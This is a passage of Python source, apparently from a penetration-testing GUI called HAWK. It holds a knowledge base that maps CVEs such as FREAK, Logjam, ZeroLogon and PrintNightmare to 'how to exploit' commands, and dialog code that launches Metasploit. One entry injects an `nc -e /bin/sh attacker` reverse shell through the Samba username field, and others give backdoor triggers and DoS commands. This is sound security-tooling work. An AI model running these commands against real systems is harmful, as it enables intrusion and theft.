                "how":"testssl.sh -j target:port\nnmap --script ssl-dh-params -p 443 target\nFix: disable DHE_EXPORT, use 2048-bit DH groups.",
                "tools":["testssl.sh","nmap","sslyze"],
                "cve":"CVE-2015-4000",
                "affects":"Any TLS server supporting DHE_EXPORT cipher suites",
            },
            "ssl-dh-params":   "__alias__cve-2015-4000",
            "logjam":          "__alias__cve-2015-4000",

            "cve-2015-0204": {
                "what":"FREAK — Factoring RSA Export Keys.\nServers supporting export-grade 512-bit RSA can be tricked into using them, then the key is factored offline (~7 hours on a laptop in 2015, minutes today).",
                "get":"Decryption of recorded TLS sessions where RSA_EXPORT was negotiated.",
                "how":"testssl.sh -F target:port\nnmap --script ssl-enum-ciphers (look for EXPORT)\nFix: disable RSA_EXPORT cipher suites entirely.",
                "tools":["testssl.sh","nmap"],
                "cve":"CVE-2015-0204",
                "affects":"OpenSSL < 1.0.1k, NSS < 3.17.3, SecureTransport (Apple)",
            },
            "freak":           "__alias__cve-2015-0204",

            # ── DoS classics ──────────────────────────────────────────────
            "cve-2007-6750": {
                "what":"Slowloris DoS — hold many half-open HTTP connections to exhaust the server's worker pool.\nTCP connection is opened, partial HTTP request is sent, server waits indefinitely.",
                "get":"Denial of Service — legitimate users can't connect once the worker pool is full. NOT RCE.",
                "how":"Metasploit: auxiliary/dos/http/slowloris\nslowhttptest -c 8000 -H -i 10 -r 200 -t GET -u http://target/\nslowloris.pl https://target/",
                "tools":["MSF","slowhttptest","slowloris.pl"],
                "cve":"CVE-2007-6750",
                "affects":"Apache 1.x/2.x without mod_reqtimeout, dhttpd, GoAhead, WebSense, IceCast, many embedded webservers",
            },
            "slowloris":       "__alias__cve-2007-6750",
            "http-slowloris":  "__alias__cve-2007-6750",

            # ── Web RCE classics (Metasploitable webapps) ────────────────
            "cve-2011-2523": {
                "what":"vsftpd 2.3.4 backdoor — a malicious patch to the official tarball briefly added a magic 'smiley face' (`:)`) trigger.\nWhen a username ending with `:)` is sent during FTP login, vsftpd opens a bind shell on TCP/6200 as root.",
                "get":"Root shell on TCP/6200 — pre-auth, no creds, no exploit chain.",
                "how":"Metasploit: exploit/unix/ftp/vsftpd_234_backdoor\nManual: nc target 21 → 'USER backdoor:)' → 'PASS x' → nc target 6200",
                "tools":["MSF","nc"],
                "cve":"CVE-2011-2523",
                "affects":"vsftpd 2.3.4 (the trojaned tarball — Metasploitable2)",
            },
            "vsftpd-backdoor": "__alias__cve-2011-2523",

            "cve-2007-2447": {
                "what":"Samba 'username map script' RCE — when smb.conf has `username map script = /path/to/script`, the username field is passed to /bin/sh -c.\nUnauthenticated attacker can inject shell commands via the SMB session-setup username.",
                "get":"Remote shell as the user under which Samba runs (typically root on Linux).",
                "how":"Metasploit: exploit/multi/samba/usermap_script\nManual: smbclient //target/share -U \"`nc -e /bin/sh attacker 4444`\"",
                "tools":["MSF","smbclient","nc"],
                "cve":"CVE-2007-2447",
                "affects":"Samba 3.0.20-3.0.25rc3 with custom username map script",
            },
            "samba-vuln":      "__alias__cve-2007-2447",
            "usermap_script":  "__alias__cve-2007-2447",

            "cve-2004-2687": {
                "what":"DistCC daemon command execution — DistCC is meant for distributed compilation but has no authentication; arbitrary commands are passed to the worker for 'compilation'.",
                "get":"Remote command execution as the 'distcc' or 'daemon' user — typically lets you escalate via a SUID nmap (Metasploitable2 ships nmap 5.x SUID).",
                "how":"Metasploit: exploit/unix/misc/distcc_exec\nManual: distccd-pump 'gcc -o /dev/stdout -E /etc/passwd'",
                "tools":["MSF"],
                "cve":"CVE-2004-2687",
                "affects":"DistCC server with default no-auth config (port 3632)",
            },
            "distcc":          "__alias__cve-2004-2687",
            "distcc-cve":     "__alias__cve-2004-2687",

            "cve-2010-2075": {
                "what":"UnrealIRCd 3.2.8.1 backdoor — the official tarball was trojaned for ~6 months before discovery. A magic string in the AB_DEBUG handler executes shell commands.",
                "get":"Pre-auth remote shell as root (the user running ircd).",
                "how":"Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor\nManual: nc target 6667 → 'AB; sh -c ...' on the right state",
                "tools":["MSF","nc"],
                "cve":"CVE-2010-2075",
                "affects":"UnrealIRCd 3.2.8.1 (the trojaned tarball)",
            },
            "unrealircd-backdoor":"__alias__cve-2010-2075",
            "irc-unrealircd": "__alias__cve-2010-2075",

            # ── Modern AD / Windows ──────────────────────────────────────
            "cve-2020-1472": {
                "what":"ZeroLogon — Netlogon protocol cryptographic flaw.\nAfter ~256 attempts an attacker can null-zero the DC's machine password via NetrServerPasswordSet2, then DCSync to dump the entire AD.",
                "get":"Domain Admin instantly. Most catastrophic AD vuln of the decade.",
                "how":"Python PoC: zerologon_tester.py + cve-2020-1472-exploit.py\nMetasploit: auxiliary/admin/dcerpc/cve_2020_1472_zerologon\nFollow up with secretsdump.py to extract NTDS.dit",
                "tools":["MSF","impacket","python PoC"],
                "cve":"CVE-2020-1472",
                "affects":"Unpatched Windows DCs (Aug 2020 patch fixes it)",
            },
            "zerologon":       "__alias__cve-2020-1472",
            "smb-vuln-cve-2020-1472":"__alias__cve-2020-1472",

            "cve-2021-34527": {
                "what":"PrintNightmare — Windows Print Spooler RpcAddPrinterDriverEx accepts attacker-controlled DLL paths.\nAuthenticated user (any domain user) loads an SMB-hosted DLL into spoolsv.exe.",
                "get":"SYSTEM execution on any host running the Print Spooler service (default ON on workstations + DCs).",
                "how":"Metasploit: exploit/windows/dcerpc/cve_2021_1675_printnightmare\nPython: SharpPrintNightmare / CVE-2021-1675.py + SMB DLL share",
                "tools":["MSF","impacket","SharpPrintNightmare"],
                "cve":"CVE-2021-34527 (and the related CVE-2021-1675)",
                "affects":"Windows with Print Spooler enabled (DCs, servers, workstations) before July 2021 patches",
            },
            "printnightmare":  "__alias__cve-2021-34527",
            "cve-2021-1675":   "__alias__cve-2021-34527",

            # ── Recon-only, "what does this mean?" ───────────────────────
            "ftp-anon": {
                "what":"FTP server allows anonymous login — the 'anonymous' or 'ftp' user is accepted with any password.",
                "get":"Read access (sometimes write) to whatever the FTP daemon shares. May contain configs, source code, backups, credentials in clear.",
                "how":"ftp target → 'anonymous' / 'anonymous@'\nlftp ftp://anonymous:anonymous@target → 'mirror .' to grab everything",
                "tools":["ftp","lftp","ncftp","wget"],
                "cve":"N/A — misconfiguration",
                "affects":"Any FTP server with anonymous login enabled (often intentional for public file servers)",
            },
            "ftp anonymous":   "__alias__ftp-anon",
            "anonymous ftp":   "__alias__ftp-anon",
            "anonymous login": "__alias__ftp-anon",

            "rsync-list-modules": {
                "what":"rsync daemon module enumeration — rsync's protocol exposes a list of named 'modules' (export points) to anyone who connects.",
                "get":"Names + descriptions of available rsync shares.  Anonymous module ACL may also let you READ/WRITE without creds.",
                "how":"rsync target::\nrsync target::module_name/ ./local_dir/   # if anon read",
                "tools":["rsync"],
                "cve":"N/A — info disclosure",
                "affects":"Any rsync server (rsyncd) with at least one defined module",
            },
            "rsync-modules":   "__alias__rsync-list-modules",

            "nfs-showmount": {
                "what":"NFS export enumeration — `showmount -e` lists what the server is exporting and to whom (host wildcards or specific IPs).",
                "get":"Names of exported file systems. If exported to '*' or your IP range, mount + access without credentials.",
                "how":"showmount -e target\nmount -t nfs target:/path /mnt/x   # if exported to your IP\nrpcinfo -p target",
                "tools":["showmount","mount.nfs","rpcinfo"],
                "cve":"N/A — info disclosure / misconfig",
                "affects":"Any NFSv2/v3 server (modern NFSv4 doesn't expose this)",
            },
        }

        # Find matching info — supports __alias__ redirects so we don't
        # have to duplicate large entries for every keyword variant
        # (e.g. "cve2010-4344" / "cve-2010-4344" / "smtp-vuln-..." all
        # resolve to the same Exim entry).
        combined = (title + " " + description).lower()
        info = None
        # Diagnostic findings describe what a tool failed to do, not
        # what the target is: their description is a list of NSE script
        # names, and keyword-matching it against the CVE table pulled
        # up an EternalBlue card because `smb-vuln-ms17-010` happened
        # to be among the scripts that ERRORED.  Skip both keyword
        # lookups for them and go straight to the generic renderer.
        # (The matching EXPLOIT WITH MSF suppression lives in
        # _MSF_SKIP_SOURCES.)
        is_diagnostic = _is_diagnostic_source(finding.get("source"))
        for key, data in (() if is_diagnostic else FINDING_INFO.items()):
            if key not in combined:
                continue
            if isinstance(data, str) and data.startswith("__alias__"):
                target_key = data[len("__alias__"):]
                resolved = FINDING_INFO.get(target_key)
                if isinstance(resolved, dict):
                    info = resolved
                    break
                continue
            if isinstance(data, dict):
                info = data
                break

        # Tool-specific info (for recon / info-gathering tools where the
        # CVE-centric FINDING_INFO doesn't apply).  Match on the tool name
        # that HAWK embeds in the finding title, e.g. "WAFW00F — 1.2.3.4".
        if not info and not is_diagnostic:
            info = self._recon_tool_info(title, description)

        # If still no match, auto-generate structured info from the
        # finding's own content so the user still sees a useful
        # explanation instead of a raw text dump.
        if not info:
            info = self._auto_generate_finding_info(
                title, description,
                severity=(finding.get("severity") or "info").lower())

        # Wider dialog so descriptions, command snippets, and URLs all
        # fit on one line instead of wrapping aggressively.  Previous
        # size 620×560 was cramped for nuclei / nmap vuln scripts that
        # dump multi-line output into the description.
        DLG_W, DLG_H = 900, 720
        WRAP = DLG_W - 80        # inner wraplength for labels
        WRAP_TITLE = DLG_W - 120

        win = _make_win(self, f"Info — {title[:60]}", DLG_W, DLG_H)
        # Cap height so _autofit can't grow the window beyond DLG_H —
        # this forces the CTkScrollableFrame body to actually scroll.
        sw = win.winfo_screenwidth()
        win.maxsize(min(int(sw * 0.9), DLG_W + 200), DLG_H)

        # ── HEADER — title + severity badge + source ───────────────────
        # Everything above the scrollable body: fixed, non-scrolling,
        # visible even when the user scrolls the details area.  Gives
        # the user an at-a-glance identity for the finding.
        header = ctk.CTkFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=4)
        header.pack(fill="x", padx=14, pady=(12, 6))

        sev = (finding.get("severity") or "info").lower()
        sev_color = {
            "critical": COLORS["text_red"],
            "high":     COLORS["text_orange"],
            "medium":   COLORS["text_yellow"],
            "low":      COLORS["text_green"],
            "info":     COLORS["text_dim"],
        }.get(sev, COLORS["text_dim"])

        top_row = ctk.CTkFrame(header, fg_color="transparent")
        top_row.pack(fill="x", padx=10, pady=(8, 2))
        ctk.CTkLabel(
            top_row, text=f"[{sev.upper()}]",
            font=_f("md", True), text_color=sev_color,
            width=100, anchor="w",
        ).pack(side="left")
        src = finding.get("source") or ""
        if src:
            ctk.CTkLabel(
                top_row, text=f"via {src}",
                font=_f("sm"), text_color=COLORS["text_muted"],
                anchor="e",
            ).pack(side="right")

        ctk.CTkLabel(
            header, text=title,
            font=_f("xl", True), text_color=COLORS["text_bright"],
            wraplength=WRAP_TITLE, justify="left", anchor="w",
        ).pack(fill="x", padx=10, pady=(0, 10))

        # ── SCROLLABLE BODY ─────────────────────────────────────────────
        body = ctk.CTkScrollableFrame(
            win, fg_color="transparent",
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["text_dim"])
        body.pack(fill="both", expand=True, padx=0, pady=(0, 4))

        occs = self._ensure_finding_occurrences(finding)
        if occs:
            hist_frame = ctk.CTkFrame(
                body, fg_color=COLORS["bg_card"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=4)
            hist_frame.pack(fill="x", padx=14, pady=(6, 8))
            ctk.CTkLabel(
                hist_frame, text="  RUN HISTORY",
                font=_f("md", True), text_color=COLORS["text_cyan"],
                anchor="w",
            ).pack(fill="x", padx=10, pady=(6, 2))
            for occ in occs:
                rid = (occ.get("linked_run_id") or "").strip()
                rid_text = f"  id {rid[:10]}" if rid else ""
                src_text = (occ.get("source") or
                            finding.get("source") or "").strip()
                if src_text:
                    src_text = f"  via {src_text}"
                ts_text = (occ.get("timestamp") or "").strip()
                line = (
                    f"#{occ.get('n', '?')}"
                    f"{'  ' + ts_text if ts_text else ''}"
                    f"{src_text}{rid_text}"
                )
                self._selectable_label(
                    hist_frame, line,
                    font=_f("sm"),
                    text_color=COLORS["text_muted"],
                    wraplength=WRAP,
                    pad=(12, (0, 2)))

        # ── FULL DESCRIPTION — prominent, first, green-bordered ─────────
        # The raw description is what the user came here for.  It sits
        # at the top of the body with a thicker green border and larger
        # font than the curated sections so the eye lands there first.
        # For long output (ffuf/gobuster can produce 100+ lines), we use
        # a CTkTextbox so the full text is visible and scrollable.
        #
        # _desc_widget / _desc_label are captured in closures by the
        # SHOW RAW toggle (built lower) so it can swap the rendered
        # text in place without rebuilding the whole dialog.
        _desc_widget = None
        _desc_label = None
        if description and description.strip():
            desc_frame = ctk.CTkFrame(
                body, fg_color=COLORS["bg_card"],
                border_color=COLORS["border_green"],
                border_width=2, corner_radius=4)
            desc_frame.pack(fill="x", padx=14, pady=(6, 10))
            _desc_label = ctk.CTkLabel(
                desc_frame, text="  FULL FINDING",
                font=_f("md", True), text_color=COLORS["text_green"],
                anchor="w",
            )
            _desc_label.pack(fill="x", padx=10, pady=(6, 2))
            desc_lines = description.count("\n") + 1
            if desc_lines > 8:
                desc_h = min(max(desc_lines * 18, 180), 500)
                desc_tb = ctk.CTkTextbox(
                    desc_frame, height=desc_h,
                    font=_f("md"),
                    fg_color=COLORS["bg_card"],
                    text_color=COLORS["text_bright"],
                    border_width=0, corner_radius=0,
                    wrap="word",
                    scrollbar_button_color=COLORS["border_dim"],
                    scrollbar_button_hover_color=COLORS["text_dim"])
                desc_tb.pack(fill="x", padx=10, pady=(0, 10))
                desc_tb.insert("1.0", description)
                desc_tb.configure(state="disabled")
                _desc_widget = desc_tb
            else:
                _desc_widget = self._selectable_label(
                    desc_frame, description,
                    font=_f("md"),
                    text_color=COLORS["text_bright"],
                    wraplength=WRAP,
                    pad=(12, (0, 10)))

        # ── SUPPLEMENTAL SECTIONS ──────────────────────────────────────
        # Curated / auto-generated guidance follows below.  Fainter
        # styling so the raw description above stays the primary signal.
        sections = [
            ("What it is:",     info["what"],    COLORS["text_dim"]),
            ("What you get:",   info["get"],     COLORS["text_green"]),
            ("How to exploit:", info["how"],     COLORS["text_cyan"]),
            ("CVE:",            info["cve"],     COLORS["text_yellow"]),
            ("Affects:",        info["affects"], COLORS["text_muted"]),
        ]
        any_section_shown = False
        for label, text, color in sections:
            if not text or text == "N/A":
                continue
            # Skip "What it is" when it is just the FULL FINDING again.
            # Two cases, both showed a redundant block under the complete
            # green FULL FINDING box: (1) a verbatim copy of the
            # description, and (2) the auto-generator's first-N-lines echo
            # (_auto_generate_finding_info uses description[:4]), which
            # reads as a *truncated* finding sitting under the full one.
            # Only skip when the FULL FINDING was actually rendered above.
            if label == "What it is:" and description and description.strip():
                _dlines = [ln.strip() for ln in description.split("\n")
                           if ln.strip()]
                _wlines = [ln.strip() for ln in (text or "").split("\n")
                           if ln.strip()]
                if (text.strip() == description.strip()
                        or (_wlines and _dlines[:len(_wlines)] == _wlines)):
                    continue
            any_section_shown = True
            sf = ctk.CTkFrame(
                body, fg_color=COLORS["bg_card"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=3)
            sf.pack(fill="x", padx=14, pady=3)
            ctk.CTkLabel(
                sf, text=f"  {label}",
                font=_f("sm", True), text_color=COLORS["text_muted"],
                anchor="w",
            ).pack(fill="x", padx=8, pady=(4, 0))
            # Selectable label-style widget — the wheel-bubble flag
            # set on the inner tk.Text routes wheel events to the
            # outer CTkScrollableFrame, so scroll-through-section
            # still works while the operator can copy any line.
            self._selectable_label(
                sf, text,
                font=_f("md"), text_color=color,
                wraplength=WRAP,
                pad=(10, (0, 6)))

        # Gentle divider when we have sections — gives the eye a rest
        # point between "your finding" and "HAWK's commentary".
        if any_section_shown:
            sep_lbl = ctk.CTkLabel(
                body,
                text="— HAWK commentary below —",
                font=_f("xs"),
                text_color=COLORS["text_muted"])
            # Not actually "below" since we pack in order — re-insert
            # *before* the first curated section.  Simpler: leave it
            # off entirely; the border difference between FULL FINDING
            # (green) and the curated cards (dim) is enough cue.
            sep_lbl.pack_forget()

        # ── FIX MOUSEWHEEL SCROLL on Windows ──────────────────────────
        # CTkScrollableFrame's internal canvas doesn't receive mousewheel
        # events when the cursor is over child widgets (CTkLabel, CTkFrame).
        # Recursively bind <MouseWheel> on every descendant so the body
        # scrolls — but SKIP CTkTextbox widgets so their own internal
        # scroll still works (e.g. the FULL FINDING textbox).
        try:
            canvas = body._parent_canvas
            def _on_mw(ev):
                try:
                    canvas.yview_scroll(int(-1 * (ev.delta / 120)), "units")
                except Exception:
                    pass
            def _bind_mw(widget):
                if isinstance(widget, ctk.CTkTextbox):
                    return
                widget.bind("<MouseWheel>", _on_mw, add="+")
                for child in widget.winfo_children():
                    _bind_mw(child)
            _bind_mw(body)
        except Exception:
            pass

        row = _btn_row(win)

        # Same filter as the row renderer — skip the MSF lookup for
        # finding sources whose action lives in custom buttons (FUZZ,
        # ADD HOSTS, ATTACK) or whose KB entry already ships an
        # authoritative PoC in the description.  Avoids surfacing
        # incorrect exploits via the keyword fallback (the
        # MCPJam/RCE → java_rmi_server overmatch).
        _info_src = (finding.get("source") or "").lower()
        _SKIP_MSF_SOURCES = (
            "bloody crawl",
            "cert-advisory",
            "connect /",
            "ffuf-vhost",
            "gobuster-dns",
            "hawk cve kb",
            "post-rce-recon",
        )
        if any(s in _info_src for s in _SKIP_MSF_SOURCES):
            exploit_modules = []
        else:
            exploit_modules = self._rank_modules_for_target(
                _get_exploits_for_vuln(title, description), finding)
        if exploit_modules:
            n_mods = len(exploit_modules)
            msf_text = ("▶ EXPLOIT WITH MSF ▾" if n_mods > 1
                        else "▶ EXPLOIT WITH MSF")
            msf_w = 200 if n_mods > 1 else 180

            def _msf_from_info(mods=exploit_modules, fi=finding):
                _safe_destroy(win)
                if len(mods) <= 1:
                    self._show_msf_launch_dialog(mods[0][0], fi)
                else:
                    self._show_msf_module_picker(mods, fi)

            ctk.CTkButton(
                row, text=msf_text,
                width=msf_w, height=32,
                font=_f("md", True),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"], border_width=1,
                text_color=COLORS["text_green"], corner_radius=4,
                command=_msf_from_info,
            ).pack(side="left", padx=(0, 8))

        # ── SHOW RAW toggle ────────────────────────────────────────
        # Visible only when the parser pushed an un-masked counterpart
        # via add_auto_finding(raw_description=...).  Survives a
        # session reload only if the parser is re-run (raw is in
        # memory only — see _FINDING_NON_PERSISTED_KEYS).
        _raw_desc = (finding.get("_raw_description") or "").strip()
        if _raw_desc and _desc_widget is not None:
            _state = {"raw": False}

            def _set_widget_text(widget, new_text):
                """Refresh a CTkTextbox / _selectable_label widget
                in-place.  Both wrap a tk.Text under the hood, but the
                disabled state must be lifted to insert."""
                try:
                    widget.configure(state="normal")
                    widget.delete("1.0", "end")
                    widget.insert("1.0", new_text)
                    widget.configure(state="disabled")
                except Exception:
                    pass

            _toggle_btn = {"ref": None}

            def _toggle_raw():
                _state["raw"] = not _state["raw"]
                showing = _state["raw"]
                _set_widget_text(
                    _desc_widget,
                    _raw_desc if showing else description)
                if _desc_label is not None:
                    try:
                        _desc_label.configure(
                            text=("  FULL FINDING  (raw values)"
                                  if showing else "  FULL FINDING"),
                            text_color=(COLORS["text_yellow"]
                                        if showing
                                        else COLORS["text_green"]))
                    except Exception:
                        pass
                if _toggle_btn["ref"] is not None:
                    try:
                        _toggle_btn["ref"].configure(
                            text=("🔒 HIDE RAW" if showing
                                  else "🔓 SHOW RAW"))
                    except Exception:
                        pass

            _toggle_btn["ref"] = ctk.CTkButton(
                row, text="🔓 SHOW RAW",
                width=130, height=32,
                font=_f("md", True),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_yellow"], border_width=1,
                text_color=COLORS["text_yellow"], corner_radius=4,
                command=_toggle_raw,
            )
            _toggle_btn["ref"].pack(side="left", padx=(0, 8))

        # ── FETCH SOURCE button ────────────────────────────────────
        # Detects 'path/file.ext[:NNN]' references in the description
        # (or its raw counterpart).  Useful for any finding that
        # points at a downloadable source file: Bloody Crawl
        # JS-secret hits ('/assets/index-XYZ.js:562'), exposed
        # '/.env' files, nuclei matches that quote a JS/HTML/JSON
        # path, etc.  Recognised extensions live in the regex inside
        # _extract_source_ref — '/.git/config' style paths
        # intentionally don't match (the dot-config trap is too
        # noisy).  On click HAWK fetches the file from the target,
        # beautifies it (if minified JS), and dumps a ±30-line
        # context window to the terminal.
        _src_match = self._extract_source_ref(
            (description or "") + "\n" + _raw_desc)
        if _src_match:
            _src_path, _src_line = _src_match

            def _fetch_now(path=_src_path, line=_src_line, fi=finding):
                self._fetch_source_to_terminal(path, line, fi)
                _safe_destroy(win)

            ctk.CTkButton(
                row, text="📄 FETCH SOURCE",
                width=160, height=32,
                font=_f("md", True),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_cyan"], border_width=1,
                text_color=COLORS["text_cyan"], corner_radius=4,
                command=_fetch_now,
            ).pack(side="left", padx=(0, 8))

        _btn(row, "OK", lambda: _safe_destroy(win), primary=True, w=120)

    @staticmethod
    def _recon_tool_info(title: str, description: str):
        """Info templates for recon / info-gathering tools where the
        CVE-centric FINDING_INFO makes no sense.

        We detect the tool from the title (HAWK embeds it as the prefix:
        'WAFW00F — 1.2.3.4', 'FFUF — 1.2.3.4', etc.) and return a
        pre-written explanation that is actually relevant to what the
        tool does and what its output means.  Returns None when no
        match — caller will fall back to the auto-generator.
        """
        # Title separators we accept: "—" (em dash), legacy "-",
        # " on " for tools like Bloody Crawl whose titles use the
        # scope-rich form "Bloody Crawl on https://target/".
        _t = (title or "")
        for sep in ("—", " on "):
            _t = _t.split(sep, 1)[0]
        head = _t.strip().upper()
        desc_low = (description or "").lower()

        TOOL_INFO = {
            "ORACLE": {
                "what": "Web Oracle is HAWK's parallel webapp profiler.  "
                        "It runs whatweb (tech fingerprint), httpx (TLS / "
                        "headers / JARM / CDN), nuclei (CVE & exposure "
                        "templates) and curl (silver-bullet path probes) "
                        "concurrently, then aggregates the results into "
                        "the tech-stack / APIs / exposures / CVEs counts "
                        "you see in the title.",
                "get": "Tech stack inventory, exposed paths (.git, .env, "
                       "swagger, server-status, …), nuclei-confirmed "
                       "CVEs, basic auth-flow detection.  When a "
                       "fingerprint matches an entry in HAWK's curated "
                       "CVE knowledge base, a SEPARATE correlated "
                       "finding (CRITICAL/HIGH) is auto-emitted with "
                       "the PoC ready — look for the 'CVE-XXXX-NNNNN' "
                       "row right after this one.",
                "how": "Just hit RUN on the Oracle card.  Tech stack "
                       "drives the next step:\n"
                       "  • Known product → check the auto-emitted CVE "
                       "finding for the PoC.\n"
                       "  • Login form → INJECTION pipeline / hydra "
                       "HTTP-POST.\n"
                       "  • API endpoints → Bloody Crawl + INJECTION "
                       "for SQLi / XSS / SSTI / LFI.\n"
                       "  • Old CMS → searchsploit + MSF.",
                "tools": ["whatweb", "httpx", "nuclei", "curl",
                          "Bloody Crawl"],
                "cve": "0 by default — but the CVE KB hook fires "
                       "automatically when a tech signature matches a "
                       "known CVE (CVE-2025-49596, CVE-2024-32651, …).",
                "affects": "Any HTTP/HTTPS service.",
            },
            "WEB ORACLE": {
                "what": "Web Oracle is HAWK's parallel webapp profiler "
                        "— see the ORACLE entry for the full breakdown.",
                "get": "Tech stack, exposures, CVEs, auth flow.  Plus "
                       "auto-emitted correlated CVE findings when a "
                       "tech signature matches the HAWK CVE KB.",
                "how": "Hit RUN on the Oracle card.  Pipe the result "
                       "into Bloody Crawl (visible endpoints), "
                       "INJECTION (parameter fuzz), or hydra (auth "
                       "brute) depending on what surfaced.",
                "tools": ["whatweb", "httpx", "nuclei", "curl"],
                "cve": "0 by default — CVE KB correlation runs "
                       "in parallel.",
                "affects": "Any HTTP/HTTPS service.",
            },
            "BLOODY CRAWL": {
                "what": "Bloody Crawl is HAWK's smart endpoint "
                        "extractor.  It reads the actual HTML / forms / "
                        "JS the application exposes (instead of guessing "
                        "from a wordlist), follows redirects, and probes "
                        "every discovered endpoint.  IDOR detector + "
                        "JS-secrets scanner run on top.",
                "get": "List of real, reachable endpoints with status "
                       "codes; HTML forms and their fields; auth-style "
                       "guesses; IDOR candidates with sequential IDs; "
                       "secrets accidentally embedded in inline JS "
                       "(API keys, tokens, internal hostnames).",
                "how": "Hit RUN on the Bloody Crawl card.  Best after "
                       "Oracle — Oracle gives you the tech stack, "
                       "Bloody Crawl gives you the URLs to attack.  "
                       "Discovered URL+param combinations auto-feed the "
                       "INJECTION pipeline.",
                "tools": ["Bloody Crawl", "katana", "ffuf"],
                "cve": "N/A",
                "affects": "Any HTTP/HTTPS service.",
            },
            "VHOST DISCOVERY": {
                "what": "Result of FUZZ VHOSTS — HAWK ran ffuf in "
                        "vhost mode (Host header brute-force) and / or "
                        "gobuster in DNS mode.  Each subdomain that "
                        "responded with 200/30x/40x is listed below "
                        "with its status code and response size.",
                "get": "Subdomains / vhosts behind the same IP.  These "
                       "are NEW attack surfaces — each may host a "
                       "different app, with different CVE exposure, "
                       "auth, and content.  HTB / THM boxes commonly "
                       "hide the real vulnerable app on a vhost the "
                       "operator has to discover.",
                "how": "1. Click ADD HOSTS to map the vhosts in "
                       "/etc/hosts (HAWK-tagged, auto-cleanup).\n"
                       "2. Click ATTACK NEW VHOSTS to launch Oracle "
                       "or Bloody Crawl on the picked sub.\n"
                       "3. Repeat per vhost — different subs often "
                       "host different stacks.",
                "tools": ["ffuf", "gobuster", "wfuzz"],
                "cve": "N/A",
                "affects": "Any web server with virtual hosting "
                           "(nginx, Apache, IIS, ALB, CloudFront).",
            },
            "DNS SUBDOMAIN DISCOVERY": {
                "what": "Result of gobuster DNS — public DNS zone "
                        "brute force.  Only catches subdomains with "
                        "real A/CNAME records; HTB / THM /etc/hosts-"
                        "only domains return zero by design (use "
                        "HTTP vhost brute for those).",
                "get": "Subdomains registered in public DNS.  Often a "
                       "different attack surface than the apex domain "
                       "— APIs, dev/staging environments, partner "
                       "portals, marketing sites.",
                "how": "Click ADD HOSTS (rarely needed — they "
                       "already resolve via DNS), then ATTACK NEW "
                       "VHOSTS to fingerprint each via Oracle.",
                "tools": ["gobuster dns", "amass", "subfinder"],
                "cve": "N/A",
                "affects": "Targets with their own public DNS zone.",
            },
            "WAFW00F": {
                "what": "Wafw00f probes the HTTP(S) endpoint with known "
                        "WAF fingerprints and looks for tell-tale headers, "
                        "cookies, or canned error responses.",
                "get": "Identification of the WAF vendor (Cloudflare, AWS "
                       "WAF, ModSecurity, F5 ASM, Imperva, Akamai, ...) "
                       "or a definitive 'no WAF detected'.",
                "how": "wafw00f -a http://<target>       # try every plugin\n"
                       "wafw00f -v http://<target>       # verbose\n"
                       "If a WAF is found, try bypasses: encoding, case\n"
                       "variation, Host-header tricks, origin-IP connect.",
                "tools": ["wafw00f", "curl", "burp"],
                "cve": "N/A",
                "affects": "Any web target behind a WAF / CDN.",
            },
            "FFUF": {
                "what": "Ffuf is a fast content discovery fuzzer. It sends "
                        "parallel HTTP requests with entries from a wordlist "
                        "in place of the FUZZ marker and reports responses "
                        "by status code and size.",
                "get": "List of valid paths / files / parameters (200, "
                       "301, 401, 403). Hidden admin panels, backup files, "
                       "API endpoints, leftover test pages.",
                "how": "ffuf -u http://<target>/FUZZ -w /usr/share/seclists/"
                       "Discovery/Web-Content/raft-medium-directories.txt\n"
                       "Filter noise:  -fc 400,404   -fs 689   (size of IIS default)\n"
                       "Vhost discovery:  -H 'Host: FUZZ.<target>' -fs 689\n"
                       "Param fuzz:  -u http://<target>/page?FUZZ=test",
                "tools": ["ffuf", "gobuster", "feroxbuster"],
                "cve": "N/A",
                "affects": "Any HTTP(S) service.",
            },
            "GOBUSTER": {
                "what": "Gobuster brute-forces directories, DNS subdomains, "
                        "or vhosts by trying every entry in a wordlist.",
                "get": "Discovered paths/files grouped by status code. 200 "
                       "= exists, 301/302 = redirect, 401/403 = protected "
                       "(still leaks existence), 400/404 = miss or noise.",
                "how": "gobuster dir -u http://<target> -w common.txt -x php,html,asp\n"
                       "gobuster vhost -u http://<target> -w subdomains.txt\n"
                       "Use `raft-medium-directories.txt` (no trailing "
                       "dots) + `-x aspx,asmx,ashx` without leading dot "
                       "to avoid `..aspx` 400-spam.",
                "tools": ["gobuster", "ffuf", "feroxbuster"],
                "cve": "N/A",
                "affects": "Any HTTP(S) / DNS service.",
            },
            "NIKTO": {
                "what": "Nikto tests web servers for 6,700+ known dangerous "
                        "files, outdated software, and server "
                        "misconfigurations.",
                "get": "Specific findings: exposed admin pages, default "
                       "files, information disclosure headers, outdated "
                       "Apache/IIS/nginx versions, cgi-bin issues.",
                "how": "nikto -h http://<target> -p 80,443\n"
                       "nikto -h http://<target> -Tuning 9  # only SQLi & RCE checks\n"
                       "Cross-reference findings with searchsploit for "
                       "versions flagged outdated.",
                "tools": ["nikto", "nmap --script http-enum", "searchsploit"],
                "cve": "N/A",
                "affects": "Any HTTP(S) service.",
            },
            "NUCLEI": {
                "what": "Nuclei runs YAML templates that describe known "
                        "CVEs, misconfigurations, and default credentials "
                        "against any target.",
                "get": "Confirmed vulnerabilities with severity tag "
                       "(critical / high / medium / low / info). Each "
                       "match comes with template-id and a reproducible "
                       "request. Directly mappable to CVEs.",
                "how": "nuclei -u http://<target> -severity critical,high\n"
                       "nuclei -u http://<target> -t cves/2023/\n"
                       "Update templates:  nuclei -update-templates",
                "tools": ["nuclei", "searchsploit", "MSF"],
                "cve": "Varies — each match names its own CVE",
                "affects": "Any target (HTTP, TCP, DNS, SSH).",
            },
            "WHATWEB": {
                "what": "Whatweb fingerprints the software stack of a web "
                        "server: CMS (WordPress, Drupal), framework, "
                        "language, analytics, JS libs, server headers.",
                "get": "Software names and often versions — the raw "
                       "material for searchsploit / CVE lookup.",
                "how": "whatweb -a 3 http://<target>   # aggressive\n"
